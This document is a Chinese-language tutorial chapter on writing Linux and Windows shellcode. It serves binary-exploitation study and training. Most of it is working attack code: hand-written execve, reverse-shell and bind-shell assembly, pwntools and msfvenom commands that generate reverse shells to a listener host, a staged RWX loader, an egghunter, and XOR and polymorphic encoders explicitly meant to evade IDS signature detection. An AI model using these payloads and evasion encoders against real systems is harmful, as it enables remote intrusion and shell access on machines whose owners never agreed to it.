---
title: "Shellcode编写技巧"
type: docs
weight: 6
---

# Shellcode编写技巧

Shellcode是一段精心构造的机器码，注入到目标进程后能直接由CPU执行，通常用于漏洞利用中获取shell或执行任意命令。本章从原理到实战，系统讲解Shellcode的编写、编码、测试和进阶技术。

## 6.1 Shellcode基础原理

### 6.1.1 什么是Shellcode

Shellcode本质上是一段不包含空字节（或可避开坏字符）的机器指令序列。它不同于普通程序——没有链接器参与、不依赖外部库、必须在任意内存地址正确执行。

```mermaid
flowchart LR
    A[漏洞触发] --> B[控制EIP/RIP]
    B --> C[跳转到Shellcode地址]
    C --> D[CPU执行Shellcode]
    D --> E[获取Shell/执行命令]
```

Shellcode的核心约束：

| 约束 | 原因 | 解决方案 |
|------|------|----------|
| 不能含`\x00` | `strcpy`遇到空字节截断 | 用等价指令替换 |
| 不能含`\x0a`/`\x0d` | `gets`遇到换行终止 | 编码或重写指令 |
| 必须是PIC代码 | 运行时地址不确定 | 用相对寻址/栈定位 |
| 体积尽量小 | 溢出缓冲区有限 | 精简指令+分阶段加载 |

### 6.1.2 系统调用：Shellcode的出口

Shellcode最终通过系统调用（syscall）与内核交互。Linux x86-64通过`syscall`指令触发，系统调用号通过`rax`传递，参数依次放在`rdi, rsi, rdx, r10, r8, r9`。

常用系统调用号（x86-64 Linux）：

| 系统调用 | 号 | 用途 |
|----------|-----|------|
| `read` | 0 | 从文件描述符读取 |
| `write` | 1 | 向文件描述符写入 |
| `open` | 2 | 打开文件 |
| `execve` | 59 | 执行程序 |
| `dup2` | 33 | 复制文件描述符 |
| `connect` | 42 | 建立网络连接 |
| `socket` | 41 | 创建socket |
| `bind` | 49 | 绑定地址 |
| `listen` | 50 | 监听连接 |
| `accept` | 43 | 接受连接 |
| `mmap` | 9 | 内存映射（用于分配可执行内存） |
| `exit` | 60 | 退出进程 |

x86（32位）使用`int 0x80`触发系统调用，调用号在`eax`，参数在`ebx, ecx, edx, esi, edi, ebp`。

## 6.2 手写Shellcode：从零开始

### 6.2.1 最小execve("/bin/sh") Shellcode

这是最经典的Shellcode——执行`execve("/bin/sh", NULL, NULL)`获取shell。

**x86-64 实现：**

```asm
; execve("/bin/sh", NULL, NULL) — x86-64 Linux
; 总长度：23字节，无坏字符
BITS 64
    xor    rsi, rsi          ; argv = NULL
    xor    rdx, rdx          ; envp = NULL
    mov    rbx, 0x68732f6e69622f  ; "/bin/sh" (注意字节序)
    push   rbx
    mov    rdi, rsp          ; rdi = 指向"/bin/sh"的指针
    push   0x3b
    pop    rax               ; rax = 59 (execve syscall号)
    syscall
```

逐行解析：

1. `xor rsi, rsi` — 将rsi清零（比`mov rsi, 0`少1字节且不含`\x00`）
2. `xor rdx, rdx` — 同上，清零rdx
3. `mov rbx, 0x68732f6e69622f` — 将"/bin/sh"作为64位立即数压入栈。`0x68='h', 0x73='s', 0x2f='/', 0x6e='n', 0x69='i', 0x62='b', 0x2f='/'`，小端序存储为`/bin/sh\0`
4. `push rbx` — 字符串入栈，栈指针rsp指向它
5. `mov rdi, rsp` — rdi = 字符串指针（execve的第一个参数）
6. `push 0x3b; pop rax` — 将59（execve的系统调用号）放入rax。用push+pop代替`mov rax, 59`可避免`\x00`字节
7. `syscall` — 触发系统调用

**x86（32位）实现：**

```asm
; execve("/bin/sh", NULL, NULL) — x86 Linux
; 总长度：21字节
BITS 32
    xor    eax, eax          ; eax = 0
    push   eax               ; 终止符 \x00
    push   0x68732f2f        ; "//sh"
    push   0x6e69622f        ; "/bin"
    mov    ebx, esp          ; ebx = "/bin//sh"
    mov    ecx, eax          ; ecx = NULL (argv)
    mov    edx, eax          ; edx = NULL (envp)
    mov    al, 0x0b          ; eax = 11 (execve syscall号)
    int    0x80              ; 触发系统调用
```

32位版本用`int 0x80`代替`syscall`，参数通过`ebx, ecx, edx`传递。注意"/bin//sh"用双斜杠填充到8字节对齐，功能等价于"/bin/sh"。

### 6.2.2 执行任意命令的Shellcode

直接执行命令比获取交互shell更有实战价值：

```asm
; execve("/bin/sh", ["/bin/sh", "-c", "id"], NULL) — x86-64
BITS 64
    ; 构造字符串 "id"
    xor    rax, rax
    push   rax               ; \x00终止符
    mov    rax, 0x6469        ; "id"
    push   rax
    mov    r12, rsp           ; r12 = "id"的指针

    ; 构造字符串 "-c"
    xor    rax, rax
    push   rax
    mov    rax, 0x632d        ; "-c"
    push   rax
    mov    r13, rsp           ; r13 = "-c"的指针

    ; 构造字符串 "/bin/sh"
    mov    rbx, 0x68732f6e69622f
    push   rbx
    mov    r14, rsp           ; r14 = "/bin/sh"的指针

    ; 构造 argv 数组 ["/bin/sh", "-c", "id", NULL]
    xor    rax, rax
    push   rax               ; argv[3] = NULL
    push   r12               ; argv[2] = "id"
    push   r13               ; argv[1] = "-c"
    push   r14               ; argv[0] = "/bin/sh"
    mov    rsi, rsp           ; rsi = argv

    mov    rdi, r14           ; rdi = "/bin/sh"
    xor    rdx, rdx           ; envp = NULL
    push   0x3b
    pop    rax
    syscall
```

### 6.2.3 Reverse Shell Shellcode

反弹Shell是最常用的Shellcode类型，连接攻击者监听端口并将stdin/stdout/stderr重定向到socket：

```asm
; x86-64 Linux Reverse Shell — 连接 127.0.0.1:4444
BITS 64
    ; 1. 创建socket
    xor    rsi, rsi
    push   2          ; AF_INET
    pop    rdi
    push   1          ; SOCK_STREAM
    pop    rsi
    xor    rdx, rdx   ; protocol = 0
    push   41
    pop    rax        ; sys_socket
    syscall
    mov    r12, rax   ; 保存sockfd

    ; 2. 连接目标
    ; 构造sockaddr_in结构体
    mov    rdi, r12
    xor    rax, rax
    push   rax               ; padding
    mov    dword [rsp+4], 0x0100007f  ; 127.0.0.1 (小端序)
    mov    word [rsp+2], 0x5c11       ; 4444 (小端序: 0x115c)
    mov    word [rsp], 2              ; AF_INET
    mov    rsi, rsp
    push   16
    pop    rdx               ; sizeof(sockaddr_in)
    push   42
    pop    rax               ; sys_connect
    syscall

    ; 3. dup2重定向stdin/stdout/stderr
    mov    rdi, r12
    xor    rsi, rsi          ; 0 = stdin
    push   33
    pop    rax               ; sys_dup2
    syscall
    mov    rdi, r12
    inc    rsi               ; 1 = stdout
    push   33
    pop    rax
    syscall
    mov    rdi, r12
    inc    rsi               ; 2 = stderr
    push   33
    pop    rax
    syscall

    ; 4. execve("/bin/sh", NULL, NULL)
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rbx, 0x68732f6e69622f
    push   rbx
    mov    rdi, rsp
    push   0x3b
    pop    rax
    syscall
```

> **注意**：`0x0100007f`是127.0.0.1的IP地址小端序表示。实战中需要替换为目标IP。端口`0x5c11`是4444的小端序。

### 6.2.4 Bind Shell Shellcode

Bind Shell在目标机器监听端口，等待攻击者连接：

```asm
; x86-64 Linux Bind Shell — 监听端口 4444
BITS 64
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor    rsi, rsi
    push   2
    pop    rdi
    push   1
    pop    rsi
    xor    rdx, rdx
    push   41
    pop    rax
    syscall
    mov    r12, rax

    ; bind(sockfd, sockaddr, 16)
    mov    rdi, r12
    xor    rax, rax
    push   rax
    mov    word [rsp], 2              ; AF_INET
    mov    word [rsp+2], 0x5c11       ; port 4444
    mov    dword [rsp+4], 0           ; INADDR_ANY
    mov    rsi, rsp
    push   16
    pop    rdx
    push   49
    pop    rax
    syscall

    ; listen(sockfd, 1)
    mov    rdi, r12
    xor    rsi, rsi
    inc    rsi
    push   50
    pop    rax
    syscall

    ; accept(sockfd, NULL, NULL)
    mov    rdi, r12
    xor    rsi, rsi
    xor    rdx, rdx
    push   43
    pop    rax
    syscall
    mov    r13, rax   ; 保存新连接的fd

    ; dup2重定向 + execve (同reverse shell)
    mov    rdi, r13
    xor    rsi, rsi
    push   33
    pop    rax
    syscall
    mov    rdi, r13
    inc    rsi
    push   33
    pop    rax
    syscall
    mov    rdi, r13
    inc    rsi
    push   33
    pop    rax
    syscall

    xor    rsi, rsi
    xor    rdx, rdx
    mov    rbx, 0x68732f6e69622f
    push   rbx
    mov    rdi, rsp
    push   0x3b
    pop    rax
    syscall
```

## 6.3 pwntools自动生成Shellcode

### 6.3.1 基本用法

pwntools的`shellcraft`模块提供了几乎所有常见场景的Shellcode模板：

```python
from pwn import *

# 设置目标架构
context.arch = 'amd64'   # 或 'i386', 'arm', 'aarch64'

# 最简单：获取shell
sc = asm(shellcraft.sh())
print(f"execve /bin/sh: {len(sc)} 字节")

# 执行命令
sc = asm(shellcraft.execve('/bin/sh', ['sh', '-c', 'whoami']))
print(f"execve cmd: {len(sc)} 字节")

# Reverse shell
sc = asm(shellcraft.connect('10.0.0.1', 4444) + shellcraft.sh())
print(f"reverse shell: {len(sc)} 字节")

# Bind shell
sc = asm(shellcraft.bindsh(4444))
print(f"bind shell: {len(sc)} 字节")

# 读取文件
sc = asm(shellcraft.cat('/etc/passwd'))
print(f"cat file: {len(sc)} 字节")
```

### 6.3.2 处理坏字符

漏洞场景不同，限制的坏字符也不同。pwntools支持自动编码避免指定字符：

```python
from pwn import *
context.arch = 'amd64'

# 常见坏字符集
bad_chars = {
    'null': b'\x00',          # strcpy终止符
    'newline': b'\x0a',       # gets终止符
    'crlf': b'\x0a\x0d',     # HTTP协议
    'quote': b'\x00\x22\x27', # 引号和空字节
}

# 生成不含坏字符的shellcode
sc = asm(shellcraft.sh(), avoid=b'\x00\x0a\x0d')
print(f"编码后长度: {len(sc)}")

# 如果shellcraft无法自动避免，使用encoder
raw = asm(shellcraft.sh())
# 使用自定义XOR编码器
def xor_encode(shellcode, key=0x41):
    """简单的XOR编码器，逐字节异或"""
    encoded = bytes([b ^ key for b in shellcode])
    # 检查编码后是否仍含坏字符
    return encoded

encoded = xor_encode(raw, key=0x55)
```

### 6.3.3 多架构支持

pwntools支持多种CPU架构的Shellcode生成：

```python
from pwn import *

# 各架构示例
architectures = {
    'i386':    {'os': 'linux', 'arch': 'i386'},
    'amd64':   {'os': 'linux', 'arch': 'amd64'},
    'arm':     {'os': 'linux', 'arch': 'arm'},
    'aarch64': {'os': 'linux', 'arch': 'aarch64'},
    'mips':    {'os': 'linux', 'arch': 'mips'},
}

for name, cfg in architectures.items():
    context.update(**cfg)
    try:
        sc = asm(shellcraft.sh())
        print(f"{name}: {len(sc)} 字节")
    except Exception as e:
        print(f"{name}: 不支持 - {e}")
```

## 6.4 Shellcode编码与变形

### 6.4.1 为什么需要编码

实际漏洞利用中，原始Shellcode几乎不可能直接使用。编码的目的是：

1. **消除坏字符** — 绕过`strcpy`、`gets`等函数的截断行为
2. **规避检测** — IDS/IPS基于特征码匹配，编码改变字节序列
3. **适配约束** — 某些漏洞要求Shellcode为纯字母数字字符

### 6.4.2 XOR编码器

XOR编码是最简单也最常用的方法：

```python
#!/usr/bin/env python3
"""自定义XOR编码器/解码器 — 含自解码stub"""

import sys

def xor_encode(shellcode: bytes, key: int = 0x55) -> tuple[bytes, bytes]:
    """
    XOR编码shellcode，返回 (解码stub + 编码后shellcode, key)
    解码stub在运行时自行解码后续的编码shellcode然后跳转执行
    """
    # 编码
    encoded = bytes([b ^ key for b in shellcode])

    # x86-64 自解码stub
    stub = (
        b"\xeb\x0e"              # jmp short _start_decode
        b"\x5e"                  # pop rsi (rsi = encoded shellcode地址)
        b"\x48\x31\xc9"          # xor rcx, rcx
        b"\xb1" + bytes([len(encoded)]) + b""  # mov cl, len
        b"\x80\x36" + bytes([key]) + b""       # xor byte [rsi], key
        b"\x48\xff\xc6"          # inc rsi
        b"\xfe\xc9"              # dec cl
        b"\x75\xf7"              # jnz xor_loop
        b"\xff\xe6"              # jmp rsi (跳转执行解码后的shellcode)
        b"\xe8\xed\xff\xff\xff"  # call pop_addr (把encoded地址压栈)
    )

    return stub + encoded, key


def check_bad_chars(shellcode: bytes, bad: bytes = b"\x00") -> bool:
    """检查shellcode是否包含坏字符"""
    for i, b in enumerate(shellcode):
        if bytes([b]) in bad:
            print(f"[!] 坏字符 0x{b:02x} 在偏移 {i}")
            return False
    return True


# 使用示例
if __name__ == "__main__":
    from pwn import *
    context.arch = 'amd64'
    raw = asm(shellcraft.sh())

    encoded, key = xor_encode(raw, key=0x55)
    print(f"原始长度: {len(raw)}")
    print(f"编码后总长度: {len(encoded)}")
    print(f"XOR密钥: 0x{key:02x}")
    print(f"无空字节: {check_bad_chars(encoded)}")

    # 打印为Python bytes字面量
    print(f"shellcode = {encoded!r}")
```

### 6.4.3 Alphanumeric Shellcode

某些漏洞场景（如缓冲区只接受字母数字字符）需要纯`[a-zA-Z0-9]`范围的Shellcode。这需要一个特殊的编码器将任意Shellcode转为字母数字形式。

核心思路：将原始字节编码为base64变种，配合一个字母数字的解码stub在运行时还原并执行：

```python
import base64

def alphanumeric_encode(shellcode: bytes) -> bytes:
    """
    将shellcode编码为纯字母数字形式
    原理：自修改代码 + base64解码stub
    """
    # 使用msfvenom的alpha_mixed编码器（推荐）
    # msfvenom -p generic/custom PAYLOADFILE=shellcode.bin -e x86/alpha_mixed -f raw
    encoded = base64.b64encode(shellcode)
    # 需要配合字母数字解码stub使用
    # 实际场景建议用msfvenom或pwnlib.encoder
    return encoded

# 推荐方式：直接用msfvenom
# msfvenom -p linux/x64/exec CMD=id -e x86/alpha_mixed BufferRegister=RAX -f python
```

### 6.4.4 多态Shellcode

多态Shellcode每次生成都不同，但功能相同，用于绕过基于固定特征码的检测：

```python
#!/usr/bin/env python3
"""多态Shellcode生成器 — 每次运行生成不同字节序列"""

import random
import os

def nop_sled(length: int) -> bytes:
    """生成随机NOP sled（用无害指令替代0x90）"""
    # 多种1字节无害指令
    nop_variants = [
        b'\x90',  # nop
        b'\x48\x90',  # xchg rax, rax (rex nop)
        b'\xf8',  # clc
        b'\xfc',  # cld
        b'\xf5',  # cmc
    ]
    sled = b''
    while len(sled) < length:
        sled += random.choice(nop_variants)
    return sled[:length]

def random_xor_key() -> int:
    """生成随机XOR密钥（排除0x00）"""
    return random.randint(1, 255)

def polymorphic_shellcode(shellcode: bytes) -> bytes:
    """生成多态版本的shellcode"""
    key = random_xor_key()
    encoded = bytes([b ^ key for b in shellcode])

    # 随机选择寄存器
    regs = ['rax', 'rbx', 'rcx', 'rdx']
    reg = random.choice(regs)

    # 生成解码stub（多态 —— 每次用不同寄存器和指令组合）
    stub = (
        b"\x48\x31\xc9"          # xor rcx, rcx
        b"\xb1" + bytes([len(encoded)])  # mov cl, len
        b"\x48\x8d\x35\x05\x00\x00\x00"  # lea rsi, [rip+5]
        b"\x80\x36" + bytes([key])        # xor byte [rsi], key
        b"\x48\xff\xc6"          # inc rsi
        b"\xfe\xc9"              # dec cl
        b"\x75\xf7"              # jnz loop
    )

    # 前置随机长度的NOP sled
    nop_len = random.randint(4, 16)
    return nop_sled(nop_len) + stub + encoded
```

## 6.5 Shellcode编写最佳实践

### 6.5.1 避免坏字符的技巧

| 坏字符 | 场景 | 替代方案 |
|--------|------|----------|
| `\x00` | `strcpy`、`strcat` | `xor reg, reg` 代替 `mov reg, 0`；`push N; pop reg` 代替 `mov reg, N` |
| `\x0a` | `gets`、逐行读取 | 避免指令编码含`0x0a`；用XOR编码 |
| `\x0d` | HTTP头解析 | 同上 |
| `\x20` | 某些协议的空格 | 用加减法构造需要的字节 |
| `\xff` | `strncpy`长度限制 | 使用更短的Shellcode或分阶段加载 |

具体替换示例：

```asm
; 错误：mov rax, 0 含 \x00
mov rax, 0              ; 48 c7 c0 00 00 00 00

; 正确：用xor清零
xor rax, rax            ; 48 31 c0

; 错误：mov rax, 0x3b 含 \x00 填充
mov rax, 0x3b           ; 48 c7 c0 3b 00 00 00

; 正确：用push+pop
push 0x3b               ; 6a 3b
pop rax                 ; 58
```

### 6.5.2 Shellcode体积优化

缓冲区空间有限时，Shellcode越小越好。常用优化手段：

1. **用短指令替代长指令**：`push imm8` 比 `mov reg, imm32` 短
2. **复用寄存器**：减少`mov`指令
3. **使用栈构造字符串**：逐字节push比mov立即数灵活
4. **分阶段加载**：第一阶段仅做`mmap`+`read`，从stdin读入完整的第二阶段payload

```asm
; 分阶段加载示例 — Stage 1：极小的loader (21字节)
; 功能：mmap RWX内存 + read stdin到该内存 + 跳转执行
BITS 64
    xor    rdi, rdi          ; addr = NULL (由内核选择)
    push   0x1000
    pop    rsi               ; size = 4096
    push   7
    pop    rdx               ; prot = PROT_READ|PROT_WRITE|PROT_EXEC
    push   0x22
    pop    r10               ; flags = MAP_PRIVATE|MAP_ANONYMOUS
    xor    r8, r8            ; fd = -1 (但这里简化)
    xor    r9, r9            ; offset = 0
    push   9
    pop    rax               ; sys_mmap
    syscall
    mov    r12, rax          ; 保存mmap返回的地址

    ; read(0, mmap_addr, 0x1000)
    xor    rdi, rdi          ; fd = stdin
    mov    rsi, r12          ; buf = mmap地址
    push   0x1000
    pop    rdx               ; count
    xor    rax, rax          ; sys_read = 0
    syscall

    jmp    r12               ; 跳转执行第二阶段
```

### 6.5.3 Shellcode编写检查清单

编写完成后，逐项检查：

```text
[ ] 不含坏字符（用xxd/pwntools验证）
[ ] 位置无关代码（无绝对地址引用）
[ ] 字符串正确终止（\x00或通过其他方式）
[ ] 系统调用号正确（区分32位和64位）
[ ] 栈对齐正确（x86-64要求16字节对齐）
[ ] 大小端序正确
[ ] 寄存器使用无冲突
[ ] 长度在缓冲区限制内
```

验证工具链：

```bash
# 提取shellcode为C数组
objdump -d shellcode.o | grep '[0-9a-f]:' | \
  grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | \
  tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | \
  sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/'

# 用pwntools验证
python3 -c "
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
print(f'长度: {len(sc)}')
print(f'含空字节: {b\"\\x00\" in sc}')
print(f'hex: {sc.hex()}')
"

# 测试执行
gcc -nostdlib -static -o test_shellcode shellcode.c
./test_shellcode
```

测试用C模板：

```c
// shellcode_tester.c — 用于测试shellcode
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    // 在此粘贴shellcode字节
    unsigned char shellcode[] =
        "\x48\x31\xf6\x56\x48\xbf\x2f\x62"
        "\x69\x6e\x2f\x2f\x73\x68\x57\x54"
        "\x5f\x6a\x3b\x58\x0f\x05";

    // 分配可执行内存
    void *exec = mmap(NULL, sizeof(shellcode),
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(exec, shellcode, sizeof(shellcode));
    printf("[*] Shellcode @ %p, 长度 %zu 字节\n", exec, sizeof(shellcode) - 1);
    printf("[*] 执行中...\n");

    // 跳转执行shellcode
    ((void(*)())exec)();
    return 0;
}
```

## 6.6 msfvenom生成Shellcode

Metasploit的msfvenom是工业级Shellcode生成工具，支持数百种payload和编码器：

```bash
# 基本：获取shell
msfvenom -p linux/x64/exec CMD=/bin/sh -f python -b '\x00'

# Reverse shell
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=10.0.0.1 LPORT=4444 \
    -f python -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 3

# Bind shell
msfvenom -p linux/x64/shell_bind_tcp \
    LPORT=4444 -f raw -b '\x00' | xxd

# 自定义payload + 编码器
msfvenom -p generic/custom \
    PAYLOADFILE=./my_shellcode.bin \
    -e x86/alpha_mixed \
    BufferRegister=RAX \
    -f python

# 列出所有编码器
msfvenom --list encoders

# 查看payload选项
msfvenom -p linux/x64/shell_reverse_tcp --list-options
```

常用编码器：

| 编码器 | 用途 | 特点 |
|--------|------|------|
| `x86/shikata_ga_nai` | XOR多态编码 | 每次生成不同，绕过特征检测 |
| `x86/alpha_mixed` | 字母数字编码 | 纯`[a-zA-Z0-9]`，绕过字符限制 |
| `x86/unicode_mixed` | Unicode编码 | 适用于Unicode环境 |
| `x86/countdown` | 倒计时编码 | 自修改代码 |
| `cmd/powershell_base64` | PowerShell Base64 | Windows命令行环境 |

## 6.7 跨平台Shellcode

### 6.7.1 ARM架构

ARM在移动设备和嵌入式系统中广泛使用，Shellcode编写有显著差异：

```asm
; ARM (32-bit) Linux execve("/bin/sh", NULL, NULL)
.global _start
_start:
    ; execve syscall number = 11
    mov r7, #11
    ; 构造 "/bin/sh" 字符串
    eor r1, r1, r1          ; argv = NULL
    eor r2, r2, r2          ; envp = NULL
    ldr r0, =binsh          ; r0 = "/bin/sh"
    svc #0                  ; ARM用svc代替int 0x80

binsh:
    .asciz "/bin/sh"

; ARM Thumb模式（更紧凑的指令）
.thumb
_start:
    mov r7, #11
    eor r1, r1
    eor r2, r2
    adr r0, binsh    ; PC相对寻址
    svc #1
binsh:
    .ascii "/bin/sh\0"
```

ARM Shellcode的关键差异：

| 特性 | x86/x86-64 | ARM |
|------|------------|-----|
| 系统调用 | `syscall`/`int 0x80` | `svc #0` 或 `swi #0` |
| 调用号寄存器 | `rax`/`eax` | `r7` |
| 参数寄存器 | `rdi, rsi, rdx...` | `r0, r1, r2...` |
| 指令长度 | 变长（1-15字节） | 固定4字节（ARM）或2字节（Thumb） |
| 空字节 | 常见问题 | Thumb模式也常含`\x00` |

### 6.7.2 Windows Shellcode

Windows没有直接的syscall接口，需要通过PEB查找kernel32.dll的`WinExec`或`CreateProcess`：

```asm
; Windows x86 Shellcode：WinExec("cmd.exe", SW_SHOW)
; 需要先通过PEB找到kernel32基地址
BITS 32
    ; 遍历PEB中的InMemoryOrderModuleList
    xor ecx, ecx
    mov eax, fs:[ecx+0x30]  ; PEB地址
    mov eax, [eax+0x0c]     ; PEB->Ldr
    mov esi, [eax+0x14]     ; Ldr->InMemoryOrderModuleList
    lodsd                    ; 第一个条目（ntdll）
    xchg eax, esi
    lodsd                    ; 第二个条目（kernel32）
    mov ebx, [eax+0x10]     ; kernel32基地址

    ; 在kernel32的导出表中查找WinExec
    ; （省略导出表解析细节，实际需遍历AddressOfNames）

    ; 调用 WinExec("cmd", 1)
    xor eax, eax
    push eax               ; \x00终止符
    push 0x6578652e        ; ".exe"
    push 0x646d63          ; "cmd\0"  (补齐4字节用push)
    mov ebx, esp
    push 1                 ; SW_SHOWNORMAL
    push ebx               ; lpCmdLine
    call eax               ; WinExec
```

## 6.8 进阶技术

### 6.8.1 Egghunter Shellcode

当缓冲区很小，无法容纳完整Shellcode时，使用Egghunter在内存中搜索预设标记（egg），找到后跳转执行真正的Shellcode。

```asm
; x86-64 Egghunter — 搜索标记 "W00T"
; 适用于溢出缓冲区极小的场景
BITS 64
    cld                       ; 方向标志清零
    xor rdx, rdx              ; 从地址0开始搜索

next_page:
    or dx, 0xfff              ; 对齐到页边界 (4096-1)

next_addr:
    inc rdx                   ; 下一个地址
    ; 使用access()系统调用检测地址是否可读
    lea rdi, [rdx]            ; pathname = 当前检测地址
    xor rsi, rsi              ; mode = F_OK
    push 21
    pop rax
    syscall

    cmp al, 0xf2              ; EFAULT = 0xf2 (地址不可读)
    je next_page              ; 不可读，跳到下一页

    ; 地址可读，检查是否为egg标记
    mov eax, 0x54303057       ; "W00T" (小端序)
    mov edi, edx
    scasd                     ; 比较[rdi]与eax，rdi+=4
    jnz next_addr             ; 不匹配，继续搜索

    scasd                     ; 检查第二次出现（防止匹配自身）
    jnz next_addr

    jmp rdi                   ; 找到egg！跳转执行
```

### 6.8.2 Self-Modifying Shellcode

自修改Shellcode在运行时改变自身代码，用于绕过静态分析：

```python
#!/usr/bin/env python3
"""自修改Shellcode生成器 — 在运行时写入并执行真正的payload"""

def self_modifying_stub(real_payload: bytes) -> bytes:
    """
    生成一个stub，它在运行时：
    1. mmap一块RWX内存
    2. 将硬编码的payload复制到该内存
    3. 跳转执行
    这样原始二进制中不直接包含可读的shellcode字符串
    """
    # 用简单的加密隐藏payload
    key = 0x37
    encrypted = bytes([b ^ key for b in real_payload])

    stub = b"""
    ; mmap RWX
    ; memcpy到mmap区域（逐字节解密）
    ; jmp到mmap区域
    """
    # 实际实现需要汇编，此处展示思路
    return stub + encrypted
```

### 6.8.3 Stack Pivoting配合Shellcode

当栈地址不可控时，需要先进行栈迁移（Stack Pivot），再执行Shellcode：

```asm
; x86-64 栈迁移 + 执行shellcode
; 假设已控制rbx指向可控区域
; gadget: xchg rsp, rbx; ret  (或 mov rsp, rbx; ret)
; 步骤：
; 1. 用ROP链将rsp迁移到可控内存
; 2. 在新栈上布置shellcode
; 3. 跳转执行

; 常用栈迁移gadgets:
; xchg rsp, rax; ret
; mov rsp, [rbx+0x30]; ret
; leave; ret (mov rsp, rbp; pop rbp)
```

## 6.9 常见错误与调试

### 6.9.1 Shellcode不工作的排查流程

```text
Shellcode执行失败
    ├── 段错误(SIGSEGV)
    │   ├── 地址错误 → 检查栈地址/缓冲区地址
    │   ├── 对齐问题 → x86-64需要16字节栈对齐
    │   └── 权限不足 → 检查NX位，需要RWX内存
    ├── 非法指令(SIGILL)
    │   ├── 架构不匹配 → 确认是32位还是64位
    │   └── 字节序错误 → 检查大小端序
    ├── Shellcode执行了但没效果
    │   ├── 系统调用号错误 → 对照sys/syscall.h
    │   ├── 参数错误 → 检查寄存器赋值
    │   └── 坏字符截断 → 检查实际注入的字节
    └── 段错误在shellcode中间
        ├── 含空字节 → hexdump检查
        └── 栈被破坏 → 检查push/pop平衡
```

### 6.9.2 GDB调试Shellcode

```bash
# 用GDB单步调试shellcode
gdb -q ./test_shellcode

# 设置断点在shellcode入口
(gdb) break *0x401180
(gdb) run

# 单步执行机器指令
(gdb) stepi
(gdb) si

# 查看寄存器
(gdb) info registers
(gdb) p/x $rax

# 查看内存中的shellcode
(gdb) x/30bx $rip
(gdb) x/10i $rip          # 反汇编当前指令

# 查看系统调用
(gdb) catch syscall
(gdb) continue

# 用pwndbg/peda增强调试体验
# pwndbg: https://github.com/pwndbg/pwndbg
# peda: https://github.com/longld/peda
```

### 6.9.3 自动化测试框架

```python
#!/usr/bin/env python3
"""Shellcode自动化测试 — 执行并捕获输出"""

import subprocess
import tempfile
import os

def test_shellcode(shellcode: bytes, timeout: int = 5) -> dict:
    """
    测试shellcode是否能成功执行并返回shell
    返回: {"success": bool, "output": str, "error": str}
    """
    # 生成测试C程序
    c_code = f'''
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
int main() {{
    unsigned char sc[] = {"".join(f"0x{b:02x}," for b in shellcode)};
    void *p = mmap(NULL, sizeof(sc), PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {{ perror("mmap"); return 1; }}
    memcpy(p, sc, sizeof(sc));
    ((void(*)())p)();
    return 0;
}}
'''
    with tempfile.NamedTemporaryFile(suffix='.c', delete=False, mode='w') as f:
        f.write(c_code)
        c_path = f.name

    bin_path = c_path.replace('.c', '')

    try:
        # 编译
        r = subprocess.run(['gcc', '-nostdlib', '-static', '-o', bin_path, c_path],
                          capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            return {"success": False, "output": "", "error": r.stderr}

        # 执行（发送echo命令测试shell是否响应）
        r = subprocess.run([bin_path],
                          input=b'echo SHELLCODE_OK\nexit\n',
                          capture_output=True, timeout=timeout)
        output = r.stdout.decode(errors='replace')
        success = 'SHELLCODE_OK' in output

        return {"success": success, "output": output, "error": ""}
    except subprocess.TimeoutExpired:
        return {"success": False, "output": "", "error": "timeout"}
    except Exception as e:
        return {"success": False, "output": "", "error": str(e)}
    finally:
        for p in [c_path, bin_path]:
            if os.path.exists(p):
                os.unlink(p)
```

## 6.10 安全防御与对抗

了解防御才能更好地理解Shellcode技术的适用场景和局限：

| 防御技术 | 作用 | Shellcode对策 |
|----------|------|---------------|
| NX/DEP | 栈/堆不可执行 | ROP、ret2libc、mprotect |
| ASLR | 地址随机化 | 信息泄露、brute force |
| Stack Canary | 栈溢出检测 | 泄露canary值、格式化字符串 |
| CFI | 控制流完整性 | JOP/COP攻击 |
| Seccomp | 系统调用白名单 | 仅用白名单内的syscall |
| SELinux/AppArmor | 强制访问控制 | 绕过或利用配置缺陷 |

Shellcode在现代防御体系下的生存空间正在缩小，但理解其原理对于二进制安全研究至关重要。实际渗透测试中，更常见的做法是使用ROP链绕过NX，或利用信息泄露绕过ASLR，再将Shellcode注入到可执行内存区域。

---

*本节介绍了Shellcode从原理到实战的完整知识体系。掌握Shellcode编写是理解二进制漏洞利用的基础，后续章节的ret2libc、ROP等技术都是在此基础上的演进。*
